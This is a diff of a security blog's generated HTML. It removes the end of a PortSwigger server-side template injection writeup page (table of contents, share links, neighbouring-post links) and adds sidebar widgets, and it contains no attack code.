-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121231332991.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121231332991.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121231332991" /></p>
-
-  </div>
+      
+        <div>
+          <a class='readmore' href='/blog/6d3d97d1.html' itemprop="url">
+            阅读全文
+          </a>
+        </div>
+      
+    </div>
   
-  
-    
-    <div class='footer'>
-       <!-- 参考资料、相关资料等 -->
-      
-       <!-- 相关文章 -->
-      
-      <!-- 版权声明组件 -->
-      
-        
-          <div class='copyright'>
-            <blockquote>
-              
-                
-                  <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
 
-                
-              
-                
-                  <p>本文永久链接是：<a href="https://fullstack-sake.github.io/blog/ac23f3c6.html">https://fullstack-sake.github.io/blog/ac23f3c6.html</a></p>
-                
-              
-            </blockquote>
+</div>
+
           </div>
         
       
-      <!-- 打赏组件 -->
-      
-    </div>
-  
+    
+  </section>
   
     
-
-
-  <div class='article-meta' id="bottom">
-    <div class='new-meta-box'>
-      
-        
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-02-04T17:01:13+08:00">
-  <a class='notlink'>
-    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2023年2月4日</p>
-  </a>
-</div>
-
-        
-      
-        
-          
-
-        
-      
-        
-          
-
-
-<div class="new-meta-item browse">
-  <a class='notlink'>
-    <p>
-      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
-      
-      <span id="busuanzi_value_page_pv">
-        <i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i>
-      </span>
-        
-      <span>次浏览</span>
-    </p>
-  </a>
-</div>
-
-
-        
-      
-        
-          
-  <div class="new-meta-item share -mob-share-list">
-  <div class="-mob-share-list share-body">
-    
-      
-        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
-          
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://fullstack-sake.github.io/blog/ac23f3c6.html&title=PortSwigger-SSTI-Writeup - sake's blog&summary="
-          
-          >
-          
-            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
-          
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://fullstack-sake.github.io/blog/ac23f3c6.html&title=PortSwigger-SSTI-Writeup - sake's blog&summary="
-          
-          >
-          
-            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
-          
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://fullstack-sake.github.io/blog/ac23f3c6.html&title=PortSwigger-SSTI-Writeup - sake's blog&summary="
-          
-          >
-          
-            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
-          
-        </a>
-      
-    
-      
-    
-      
-    
-  </div>
-</div>
-
-
-
-        
-      
-    </div>
-    <!-- Custom Files bottomMeta begin -->
-    
-    <!-- Custom Files bottomMeta end -->
-  </div>
-
-
-  
-  
-
-  
-    <div class="prev-next">
-      
-        <a class='prev' href='/blog/d9b0ba88.html'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>PortSwigger-Access control-Writeup</p>
-          <p class='content'>
-本文所谈及技术只为网络安全人员进行服务器检测或维护参考，仅供学习交流，请勿用于违法用途。
-
-
-
-访问控制（或授权）是对谁（或什么）可以执行尝试的操作或访问他们请求的资源的约束的应用。在web应...</p>
-        </a>
-      
-      
-        <a class='next' href='/blog/a2333c3d.html'>
-          <p class='title'>PortSwigger-Authentication-Writeup<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>
-本文所谈及技术只为网络安全人员进行服务器检测或维护参考，仅供学习交流，请勿用于违法用途。
-
-
-
-身份验证是验证给定用户或客户端身份的过程。换言之，这涉及到确保他们真的是他们声称的那个人。至少在...</p>
-        </a>
-      
-    </div>
-  
-  <!-- 文章推荐 -->
-  
-  
-  <!-- Custom Files postEnd begin-->
-  
-  <!-- Custom Files postEnd end-->
-</article>
-
-
   
 
 
-  <article class="post white-box shadow floatable blur" id="comments">
-    <span hidden>
-      <meta itemprop="discussionUrl" content="/blog/ac23f3c6.html#comments">
-    </span>
-    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
-    
-
-    <div id="layoutHelper-comments"></div>
-
-  </article>
-
-
-
-
-
-
+	
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -3155,48 +2786,139 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
+<section class="widget blogger desktop mobile pjax">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box circle' href='/about/'>
+          <img no-lazy src='https://avatars.githubusercontent.com/u/64351788'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>SAKE</h2>
+        
+        
+          <p>Hi there 👋</p>
+
+        
+        
+          <p><span id="jinrishici-sentence">sake's blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/"
+              class="social fa-solid fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:1193368126@qq.com"
+              class="social fa-solid fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/fullstack-sake/"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="/"
+              class="social fa-solid fa-headphones-alt flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
     
   
 
-
-<div class="widget-sticky pjax">
-
   
+    
+    
+      
   
-
-
-  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+  <section class="widget category desktop pjax">
     
   <header>
     
-      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
     
   </header>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#basic-server-side-template-injection"><span class="toc-text"> Basic server-side template injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#basic-server-side-template-injection-code-context"><span class="toc-text"> Basic server-side template injection (code context)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#server-side-template-injection-with-information-disclosure-via-user-supplied-objects"><span class="toc-text"> Server-side template injection with information disclosure via user-supplied objects</span></a></li></ol>
+      <ul class="entry navigation">
+        
+          <li><a class="flat-box"
+            title="/categories/Tech/" href="/categories/Tech/"
+            active-action="action-categoriesTech"
+            ><div class='name'>Tech</div><div class='badge'>(9)</div></a></li>
+        
+      </ul>
     </div>
   </section>
 
+
+    
   
+
+  
+    
+    
+      
+  
+  <section class="widget tagcloud desktop mobile pjax">
+    
+  <header>
+    
+      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      <a href="/tags/AI/" style="font-size: 14px; color: #999">AI</a> <a href="/tags/DIP/" style="font-size: 14px; color: #999">DIP</a> <a href="/tags/DevOps/" style="font-size: 14px; color: #999">DevOps</a> <a href="/tags/EIE/" style="font-size: 14px; color: #999">EIE</a> <a href="/tags/SQLI/" style="font-size: 14px; color: #999">SQLI</a> <a href="/tags/Web/" style="font-size: 24px; color: #555">Web</a> <a href="/tags/XSS/" style="font-size: 14px; color: #999">XSS</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">命令注入</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 14px; color: #999">目录遍历</a>
+    </div>
+  </section>
+
+
+    
+  
+
+  
+
+
+<div class="widget-sticky pjax">
 
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
-
-  <div class="pjax">
-    <!-- pjax占位 -->
-  </div>
-
-  <div class="pjax">
-    <!-- pjax占位 -->
-  </div>
-
-  <div class="pjax">
-    <!-- pjax占位 -->
-  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -3220,14 +2942,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
-
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=true;
+  pdata.ispage=false;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -3236,7 +2957,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.add("show");
+    l_header.classList.remove("show");
     
     
   
@@ -3951,7 +3672,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"sake's blog","url":"https://fullstack-sake.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"sake","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://fullstack-sake.github.io/","sameAs":["https://github.com/fullstack-sake"],"description":"fullstack-sake's blog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://fullstack-sake.github.io/","name":"sake's blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https://fullstack-sake.github.io/blog/ac23f3c6.html","name":"PortSwigger-SSTI-Writeup"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"sake's blog","url":"https://fullstack-sake.github.io/","keywords":"fullstack-sake,fullstacksake,sake,blog","description":"fullstack-sake's blog","author":{"@type":"Person","name":"sake","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://fullstack-sake.github.io/","description":"fullstack-sake's blog"},"publisher":{"@type":"Organization","name":"sake's blog","url":"https://fullstack-sake.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://fullstack-sake.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"PortSwigger-SSTI-Writeup","description":"fullstack-sake's blog","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://fullstack-sake.github.io/blog/ac23f3c6.html"},"author":{"@type":"Person","name":"sake","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://fullstack-sake.github.io/"},"publisher":{"@type":"Organization","name":"sake's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://fullstack-sake.github.io/blog/ac23f3c6.html","wordCount":0,"datePublished":"2023-01-21T09:26:21.000Z","dateModified":"2023-02-04T09:01:13.061Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"sake's blog","url":"https://fullstack-sake.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"sake","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://fullstack-sake.github.io/","sameAs":["https://github.com/fullstack-sake"],"description":"fullstack-sake's blog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://fullstack-sake.github.io/","name":"sake's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"https://fullstack-sake.github.io/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"https://fullstack-sake.github.io/archives/2023/","name":"2023年"}},{"@type":"ListItem","position":4,"item":{"@id":"https://fullstack-sake.github.io/archives/2023/3/","name":"3月"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"sake's blog","url":"https://fullstack-sake.github.io/","keywords":"fullstack-sake,fullstacksake,sake,blog","description":"fullstack-sake's blog","author":{"@type":"Person","name":"sake","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://fullstack-sake.github.io/","description":"fullstack-sake's blog"},"publisher":{"@type":"Organization","name":"sake's blog","url":"https://fullstack-sake.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://fullstack-sake.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"fullstack-sake's blog","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"sake","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://fullstack-sake.github.io/"},"publisher":{"@type":"Organization","name":"sake's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
